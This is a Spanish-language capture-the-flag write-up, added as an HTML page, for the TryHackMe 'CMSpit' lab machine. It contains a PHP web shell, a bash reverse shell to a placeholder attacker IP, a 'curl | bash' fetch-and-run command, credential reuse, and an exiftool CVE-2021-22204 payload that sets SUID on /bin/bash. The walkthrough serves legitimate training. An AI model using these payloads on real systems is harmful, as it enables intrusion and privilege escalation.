@@ -1,0 +1,747 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>CMSpit- Tryhackme - b0ySie7e.github.io</title>
+<meta name="description" content="Maquina de nivel media, creada por stuxnet. En la que se explotan vulnerabilidades como CVE-2020-35847, CVE-2020-35848 en la versión de un Cockpit CMS 0.11.1  y CVE-2021-22204 que tiene la herramienta de exiftool en la que se aprovecha para realizar ejecución de comandos y poder ganar privilegios a nivel de usuario">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="b0ySie7e.github.io">
+<meta property="og:title" content="CMSpit- Tryhackme">
+<meta property="og:url" content="http://localhost:4000/CMSpit/">
+
+
+  <meta property="og:description" content="Maquina de nivel media, creada por stuxnet. En la que se explotan vulnerabilidades como CVE-2020-35847, CVE-2020-35848 en la versión de un Cockpit CMS 0.11.1  y CVE-2021-22204 que tiene la herramienta de exiftool en la que se aprovecha para realizar ejecución de comandos y poder ganar privilegios a nivel de usuario">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/CMSpit/logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-03-19T00:00:00-04:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/CMSpit/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "b0ySie7e.github.io",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="b0ySie7e.github.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/logo.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Inicio</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Publicaciones</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">Sobre mí</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">CMSpit- Tryhackme</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="B0Y-SIE7E" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">B0Y-SIE7E</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cibersecurity, CTF THB-THM
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Perú</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://twitter.com/B0ySie7e" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/B0ySie7e" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="CMSpit- Tryhackme">
+    <meta itemprop="description" content="Maquina de nivel media, creada por stuxnet. En la que se explotan vulnerabilidades como CVE-2020-35847, CVE-2020-35848 en la versión de un Cockpit CMS 0.11.1  y CVE-2021-22204 que tiene la herramienta de exiftool en la que se aprovecha para realizar ejecución de comandos y poder ganar privilegios a nivel de usuario">
+    <meta itemprop="datePublished" content="March 19, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">CMSpit- Tryhackme
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-03-19T00:00:00-04:00">March 19, 2022 </time> 
+          
+          
+        </p>
+        <table>
+  <thead>
+    <tr>
+      <th style="text-align: left">NOMBRE</th>
+      <th style="text-align: center">Plataforma</th>
+      <th style="text-align: right">OS</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">CMSpit</td>
+      <td style="text-align: center">TRYHACKME</td>
+      <td style="text-align: right">LINUX</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="escaneo-de-puertos">ESCANEO DE PUERTOS</h2>
+
+<ul>
+  <li>Realizamos un escaneo de puertos con la herramienta nmap, en esta caso lo podemos realizar con muchas otras pero yo la realizaré con nmap</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">(</span>kali㉿Hacknet<span class="o">)</span>-[~/…/tryhackme/maquinas/CMSpit/recognition]
+  Sie7e&gt;<span class="nv">$ </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.207.156  
+</code></pre></div></div>
+<ul>
+  <li>
+<strong>-p-</strong> : Es el rango de puertos las cuales va escanear.</li>
+  <li>
+<strong>–open</strong> : Solo nos reportará los puertos que tienen status “open”.</li>
+  <li>
+<strong>–min-rate</strong> : Indica la tasa minima de paquetes, esto acelerará el escaneo. Esto puede tener muchas deficiencias cuando la condición de la red es muy mala y en ese caso es mejor realizar un <strong>T4</strong> o <strong>T5</strong>.</li>
+  <li>
+<strong>-vvv</strong> : Con este parametro podemos ver la output mientras va escaneando y asi adelantar un poco mas de trabajo.</li>
+  <li>
+<strong>-n</strong> : Parametro que indica que no deseamos que realiza host discovery, con esto activo puede demorar un poco mas el escaneo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+  Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-19 12:30 EDT
+  Initiating Connect Scan at 12:30
+  Scanning 10.10.207.156 <span class="o">[</span>65535 ports]
+  Discovered open port 80/tcp on 10.10.207.156
+  Discovered open port 22/tcp on 10.10.207.156
+  Completed Connect Scan at 12:31, 27.68s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+  Nmap scan report <span class="k">for </span>10.10.207.156
+  Host is up, received user-set <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>
+  Scanned at 2022-03-19 12:30:46 EDT <span class="k">for </span>28s
+  Not shown: 63620 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>, 1913 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+  Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+  PORT   STATE SERVICE REASON
+  22/tcp open  ssh     syn-ack
+  80/tcp open  http    syn-ack
+
+  Read data files from: /usr/bin/../share/nmap
+  Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>27.74 seconds
+</code></pre></div></div>
+
+<ul>
+  <li>NMAP nos reporta dos puertos el 22 y 80, entonces con nmap vamos a escanear los servicios y versiones que se estan ejecutando en estos puertos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">(</span>kali㉿Hacknet<span class="o">)</span>-[~/…/tryhackme/maquinas/CMSpit/recognition]
+  Sie7e&gt;<span class="nv">$ </span>nmap <span class="nt">-p22</span>,80 <span class="nt">-sCV</span> <span class="nt">-vv</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> servicesScan.nmap 10.10.207.156
+</code></pre></div></div>
+<ul>
+  <li>
+<strong>-p22,80</strong>  : Puertos en espacificos que deseamos escanear.</li>
+  <li>
+<strong>-sC</strong> : Scripts por defecto que se usaran para la enumeración.</li>
+  <li>
+<strong>-sV</strong> :Enumerar las versiones y servicios</li>
+  <li>
+<strong>-sCV</strong> : Otra manera de indicar <strong>-sC</strong> y <strong>-sV</strong> de manera junta.</li>
+  <li>
+<strong>-oN</strong> : Para que nos guarde la información enumerada en formato nmap.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c"># Nmap 7.92 scan initiated Fri Mar 18 13:40:54 2022 as: nmap -p22,80 -sCV -vv -Pn -oN servicesScan.nmap 10.10.207.156</span>
+  Nmap scan report <span class="k">for </span>10.10.207.156
+  Host is up, received user-set <span class="o">(</span>0.22s latency<span class="o">)</span><span class="nb">.</span>
+  Scanned at 2022-03-18 13:40:55 EDT <span class="k">for </span>22s
+
+  PORT   STATE SERVICE REASON  VERSION
+  22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+  | ssh-hostkey: 
+  |   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 <span class="o">(</span>RSA<span class="o">)</span>
+  | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7acH8krj6oVh6s+R3VYnJ/Xc8o5b43RcrRwiMPKe7V8V/SLfeVeHtE06j0PnfF5bHbNjtLP8pMq2USPivt/LcsS+8e+F5yfFFAVawOWqtd9tnrXVQhmyLZVb+wzmjKe+BaNWSnEazjIevMjD3bR8YBYKnf2BoaFKxGkJKPyleMT1GAkU+r47m2FsMa+l7p79VIYrZfss3NTlRq9k6pGsshiJnnzpWmT1KDjI90fGT6oIkALZdW/++qXi+px6+bWDMiW9NVv0eQmN9eTwsFNoWE3JDG7Aeq7hacqF7JyoMPegQwAAHI/ZD66f4zQzqQN6Ou6+sr7IMkC62rLMjKkXN
+  |   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b <span class="o">(</span>ECDSA<span class="o">)</span>
+  | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEnbbSTSHNXi6AcEtMnOG+srCrE2U4lbRXkBxlQMk1damlhG+U0tmiObRCoasyBY2kvAdU/b7ZWoE0AmoYUldvk<span class="o">=</span>
+  |   256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 <span class="o">(</span>ED25519<span class="o">)</span>
+  |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKYUS/4ObKPMEyPGlgqg6khm41SWn61X9kGbNvyBJh7e
+  80/tcp open  http    syn-ack Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+  |_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+  |_http-trane-info: Problem with XML parsing of /evox/about
+  | http-methods: 
+  |_  Supported Methods: GET HEAD POST OPTIONS
+  | http-title: Authenticate Please!
+  |_Requested resource was /auth/login?to<span class="o">=</span>/
+  |_http-favicon: Unknown favicon MD5: C9CD46C6A2F5C65855276A03FE703735
+  Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+  Read data files from: /usr/bin/../share/nmap
+  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+  <span class="c"># Nmap done at Fri Mar 18 13:41:17 2022 -- 1 IP address (1 host up) scanned in 23.06 seconds</span>
+</code></pre></div></div>
+
+<h2 id="sitio-web">SITIO WEB</h2>
+<p>Se encuentra un sitio web con un login, de la cual no tenemos credenciales.</p>
+
+<p><img src="/assets/images/CMSpit/webLogin.png" alt=""></p>
+
+<p>Enumerando un poco no topamos un directorio que nos muestra la versión</p>
+
+<p><img src="/assets/images/CMSpit/version.png" alt=""></p>
+
+<p>Teniendo la versión, buscamos un exploit y nos topamos con uno. Este permite enumerar usuarios y cambiar la contraseña.</p>
+
+<h2 id="cve-2020-35847---cve-2020-35848">CVE-2020-35847 - CVE-2020-35848</h2>
+
+<p><img src="/assets/images/CMSpit/search_exploit.png" alt=""></p>
+
+<p>Nos lo traemos a nuestro direcorio de trabajo y ejecutamos. Enumeramos los usuarios existentes:</p>
+
+<ul>
+  <li>admin</li>
+  <li>darkStart7471</li>
+  <li>skidy</li>
+  <li>ekoparty</li>
+</ul>
+
+<p>De los cuales podemos cambiar las contraseñas. En caso nuestro cambiaremos la contraseña del usuario admin.</p>
+
+<p><img src="/assets/images/CMSpit/exploit_exec.png" alt=""></p>
+
+<h2 id="web-shell">WEB SHELL</h2>
+<p>Estando logueados podemos enumerar el CMS para realizar ejecución de comandos dentro del sistema. En este apartado vemos un campo en el cual podemos subir un archivo.</p>
+
+<p><img src="/assets/images/CMSpit/upload_file.png" alt=""></p>
+
+<p>Vemos un boton para poder subir un archivo</p>
+
+<p><img src="/assets/images/CMSpit/upload_file02.png" alt=""></p>
+
+<p>Vamos a subir una <a href="https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/">web shell</a> en php.</p>
+
+<p>shell.php</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+   <span class="k">echo</span><span class="p">(</span><span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]));</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Este archivo en php(web shell) nos permitira ejecutar comandos en el sistema victima.</p>
+
+<p><img src="/assets/images/CMSpit/upload_file03.png" alt=""></p>
+
+<p>Ya tenemos la shell.php subida.</p>
+
+<p><img src="/assets/images/CMSpit/shell.png" alt=""></p>
+
+<p>Necesitamos la ruta de donde se almacenó nuestro shell.php y para eso nos vamos al apartado siguiente</p>
+
+<p><img src="/assets/images/CMSpit/shell02.png" alt=""></p>
+
+<p>Si le pasamos el comando <strong>ls -la</strong>, vemos que los lista los archivos existentes dentro del sistema víctima</p>
+
+<p><img src="/assets/images/CMSpit/shell03.png" alt=""></p>
+
+<h2 id="ganar-acceso-a-la-máquina">GANAR ACCESO A LA MÁQUINA</h2>
+
+<p>Para obtener el acceso a la maquína, vamos a crearnos un archivo index.html que contendra lo siguiente.</p>
+
+<p>index.html</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i &gt;<span class="err">&amp;</span> /dev/tcp/YOU-IP/443 0&gt;<span class="err">&amp;</span>1
+</code></pre></div></div>
+<p>Esto se puede realizar de muchas maneras ya que tenemos ejecución de comandos a nivel del sistema víctima.</p>
+
+<p>Luego iniciamos un servidor en python indicandole el puerto en donde va ejecutarse.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">80</span>
+</code></pre></div></div>
+
+<p>Y ponernos a la escucha en el puerto 443 para ganar acceso a la máquina, ya que en el archivo index.html le indicamos que a ese puerto nos enviará una shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncat <span class="nt">-lnvp</span> 443
+</code></pre></div></div>
+
+<p><img src="/assets/images/CMSpit/shell04.png" alt=""></p>
+
+<p>En la url ponemos lo siguiente:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.207.156/storage/uploads/2022/03/19/62360bf9715d0shell.php?cmd=curl http://IP | bash 
+</code></pre></div></div>
+
+<p>Realizamos un curl a nuestro servidor que esta con python y lo vamos a interpretar con bash, esto noes permite entablarnos un shell a nivel de terminal</p>
+
+<p><img src="/assets/images/CMSpit/shell05.png" alt=""></p>
+
+<p>Una vez ganado acceso, realizamos un tratamiento de la tty, para tener un mejor manejo de la consola y que esta sea iteractiva</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null <span class="nt">-c</span> bash
+^Z
+<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg
+</span>reset xterm
+
+<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash 
+
+<span class="nb">stty </span>rows &lt;your rows terminal&gt; columns &lt;your columns terminal&gt;
+</code></pre></div></div>
+
+<h2 id="user-www-data">USER WWW-DATA</h2>
+
+<p>Enumerando los directorios, en /home/stux encontramos un archivo <strong>.dbshell</strong></p>
+
+<p><img src="/assets/images/CMSpit/dbshell.png" alt=""></p>
+
+<p>En este archivo encontramos credenciales del usuario <strong>stux</strong> que usa en una base de datos. Entonces podemos probar si se reutilizan las credenciales</p>
+
+<p><img src="/assets/images/CMSpit/dbshell02.png" alt=""></p>
+
+<p>Desde luego se estan reutilizando las credenciales</p>
+
+<h2 id="user-stux">USER STUX</h2>
+<p>Teniendo las credenciales vamos a enumerar los privilegios que tiene este usuario</p>
+
+<p><img src="/assets/images/CMSpit/stux01.png" alt=""></p>
+
+<p>Si nos vamos a <a href="https://gtfobins.github.io/gtfobins/exiftool/#sudo">gtfobins</a>, vemos una manera de obtener los archivos. Haciendo uso del siguiente comando</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>exiftool <span class="nt">-filename</span><span class="o">=</span>/tmp/root.txt /root/root.txt
+</code></pre></div></div>
+<p>Ya tenemos nuestra flag, pero lo que queremos es ganar privilegios de usuario root</p>
+
+<h2 id="cve-2021-22204-exiftool">CVE-2021-22204-exiftool</h2>
+
+<p>Buscando en la web y damos con un blog en la que explica la vulnerabilidad y como podemos ejecutar comandos de manera manual.</p>
+
+<p><strong>BLOG</strong> : <a href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/">cve-2021-22204-exiftool-rce</a></p>
+
+<p><img src="/assets/images/CMSpit/stux02.png" alt=""></p>
+
+<p><strong>Exploit</strong> que podemos usar para generar de manera automatizada nuestra imagen con el payload indicado.</p>
+
+<p><img src="/assets/images/CMSpit/stux03.png" alt=""></p>
+
+<p>Vamos a instalar la djvulibre-bin</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>kali㉿Hacknet<span class="o">)</span>-[~/…/tryhackme/maquinas/CMSpit/exploit]
+Sie7e&gt;<span class="nv">$ </span><span class="nb">sudo </span>apt <span class="nb">install </span>djvulibre-bin
+</code></pre></div></div>
+<p>Tambien necesitaremos un imagen  y nuestro payload que queremos que ejecute root.</p>
+
+<p>Payload, contendra lo siguiente:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>metadata <span class="s2">"</span><span class="se">\c</span><span class="k">${</span><span class="nv">system</span><span class="p">(</span><span class="s1">'chmod +s /bin/bash'</span><span class="p">)</span><span class="k">}</span><span class="s2">;"</span><span class="o">)</span>
+</code></pre></div></div>
+<p>Con esto vamos a la /bin/bash para que sea SUID y con bash -p podamos ser usuario root.</p>
+
+<p>Ejecutamos bzz:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>kali㉿Hacknet<span class="o">)</span>-[~/…/tryhackme/maquinas/CMSpit/exploit]
+Sie7e&gt;<span class="nv">$ </span>bzz payload payload.bzz
+</code></pre></div></div>
+
+<p>Creamos un exxploit.djvu:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>kali㉿Hacknet<span class="o">)</span>-[~/…/tryhackme/maquinas/CMSpit/exploit]
+Sie7e&gt;<span class="nv">$ </span>djvumake exploit.djvu <span class="nv">INFO</span><span class="o">=</span><span class="s1">'1,1'</span> <span class="nv">BGjp</span><span class="o">=</span>/dev/null <span class="nv">ANTz</span><span class="o">=</span>payload.bzz
+</code></pre></div></div>
+
+<p><img src="/assets/images/CMSpit/stux04.png" alt=""></p>
+
+<p><strong>configfile</strong></p>
+
+<p><img src="/assets/images/CMSpit/stux05.png" alt=""></p>
+
+<p>Ahora solo le pasamos el payload a nuestra imagen y cuando se ejecute con exiftool ejecutaremos el comando que le indicamos en nuestro payload</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>kali㉿Hacknet<span class="o">)</span>-[~/…/tryhackme/maquinas/CMSpit/exploit]
+Sie7e&gt;<span class="nv">$ </span>exiftool <span class="nt">-config</span> configfile <span class="s1">'-HasselbladExif&lt;=exploit.djvu'</span> image.jpg
+</code></pre></div></div>
+
+<p>Subimos nuestra imagen con al maquina victima, hay muchas maneras de como subirlo (pyhton, ncat).</p>
+
+<p><img src="/assets/images/CMSpit/stux06.png" alt=""></p>
+
+<p>La bash <strong>no es SUID</strong></p>
+
+<p><img src="/assets/images/CMSpit/stux07.png" alt=""></p>
+
+<p>Ejecutamos exiftool ccon nuestra imagen, y deberia de haber cambiado los permisos de la <strong>/bin/bash</strong></p>
+
+<p><img src="/assets/images/CMSpit/stux08.png" alt=""></p>
+
+<p>La <strong>/bin/bash</strong> ahora es SUID</p>
+
+<p><img src="/assets/images/CMSpit/stux09.png" alt=""></p>
+
+<h2 id="user-root">USER ROOT</h2>
+
+<p><img src="/assets/images/CMSpit/root.png" alt=""></p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#medium" class="page__taxonomy-item" rel="tag">medium</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#write-up" class="page__taxonomy-item" rel="tag">write up</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#xxe" class="page__taxonomy-item" rel="tag">xxe</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#tryhackme" class="page__taxonomy-item" rel="tag">tryhackme</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-03-19T00:00:00-04:00">March 19, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/Vulnerabilidades-web/" class="pagination--pager" title="Vulnerabilidades Web
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 b0ySie7e.github.io</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
